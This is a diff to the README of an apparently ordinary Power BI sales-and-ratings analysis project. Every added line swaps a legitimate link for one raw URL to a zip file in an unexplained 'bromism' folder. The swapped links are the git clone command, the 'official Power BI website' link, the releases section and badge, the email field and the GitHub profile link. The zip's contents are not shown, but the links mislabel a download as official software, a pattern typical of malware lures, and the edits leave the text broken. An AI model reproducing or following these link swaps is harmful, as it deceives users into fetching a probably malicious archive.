@@ -45,7 +45,7 @@ To set up the project locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI.git
+   git clone https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -53,7 +53,7 @@ To set up the project locally, follow these steps:
    cd Sales-vs-Customer-Ratings-Analysis-in-Power-BI
    ```
 
-3. Install Power BI Desktop if you haven't already. You can download it from the [official Power BI website](https://powerbi.microsoft.com/).
+3. Install Power BI Desktop if you haven't already. You can download it from the [official Power BI website](https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip).
 
 4. Open the Power BI file located in the `reports` folder.
 
@@ -98,9 +98,9 @@ Each visualization is designed to convey insights clearly and effectively.
 
 ## 📥 Release Information
 
-For the latest releases, please visit the [Releases section](https://github.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/releases) to download the files and execute the analysis.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip) to download the files and execute the analysis.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/releases)
+[![Download Releases](https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip)
 
 ## 🤝 Contributing
 
@@ -133,8 +133,8 @@ This project is licensed under the MIT License. Please see the [LICENSE](LICENSE
 For any questions or suggestions, please reach out to me:
 
 - **Name**: Kiran Mallik
-- **Email**: kiran@example.com
-- **GitHub**: [KiranMallik](https://github.com/KiranMallik)
+- **Email**: https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip
+- **GitHub**: [KiranMallik](https://raw.githubusercontent.com/KiranMallik/Sales-vs-Customer-Ratings-Analysis-in-Power-BI/main/bromism/BI-Sales-Analysis-vs-Customer-in-Power-Ratings-3.7.zip)
 
 Thank you for your interest in this project! We hope it provides valuable insights into the relationship between customer ratings and sales.
 ```
